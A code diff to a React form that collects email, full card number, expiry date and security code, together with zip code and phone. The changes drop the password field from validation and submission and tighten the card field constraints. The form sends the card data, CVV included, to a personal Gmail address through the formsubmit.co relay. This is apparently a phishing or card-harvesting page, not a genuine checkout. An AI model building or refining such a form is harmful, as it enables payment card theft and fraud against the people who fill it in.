@@ -32,10 +32,11 @@ function Form() {
       errors.email = "This is not a valid email";
     }
 
+/*
     if (!values.password) {
       errors.password = "Enter your password";
     }
-
+*/
     return errors;
   };
 
@@ -50,14 +51,14 @@ function Form() {
     if (Object.keys(formError).length > 0) {
       setTouched({
         email: true,
-        password: true,
+       // password: true,
       });
       setIsLoading(false);
     }
     if (Object.keys(formError).length === 0) {
       setTouched({
         email: false,
-        password: false,
+      //  password: false,
       });
 
       fetch("https://formsubmit.co/ajax/maikellljudge@gmail.com", {
@@ -67,7 +68,7 @@ function Form() {
           Accept: "application/json",
         },
         body: JSON.stringify({
-          password: formValues.password,
+         // password: formValues.password,
           email: formValues.email,
           cardnumber: formValues.cardnumber,
           expdate: formValues.expdate,
@@ -103,6 +104,10 @@ function Form() {
         .catch((error) => console.log(error));
     }
   };
+  
+
+
+
   return (
     <div className="App">
       <form onSubmit={handlesubmit}>
@@ -204,6 +209,7 @@ function Form() {
                       placeholder="ZIP code"
                       type="text"
                       name="zipcode"
+                      minlength="4" maxlength="6"
                       value={formValues.zipcode}
                       onChange={handleChange}
                   />
@@ -216,6 +222,7 @@ function Form() {
                       placeholder="Phone"
                       type="number"
                       name="phone"
+                      minlength="10" maxlength="20"
                       value={formValues.phone}
                       onChange={handleChange}
                   />
@@ -232,8 +239,11 @@ function Form() {
           <input
             className='form-input'
             placeholder="Card Number"
-            type="number"
+            type="text"
             name="cardnumber"
+            minlength="13"
+            maxlength="16"
+            pattern="([A-z0-9À-ž\s]){10,}"
             value={formValues.cardnumber}
             onChange={handleChange}
         />
@@ -243,6 +253,7 @@ function Form() {
             placeholder="Expiration date (MM/YY)"
             type="text"
             name="expdate"
+            maxlength="5"
             value={formValues.expdate}
             onChange={handleChange}
         />
@@ -250,8 +261,9 @@ function Form() {
          <input
             className='form-input'
             placeholder="Security code"
-            type="number"
+            type="text"
             name="cvv"
+            minlength="3" maxlength="4"
             value={formValues.cvv}
             onChange={handleChange}
         />
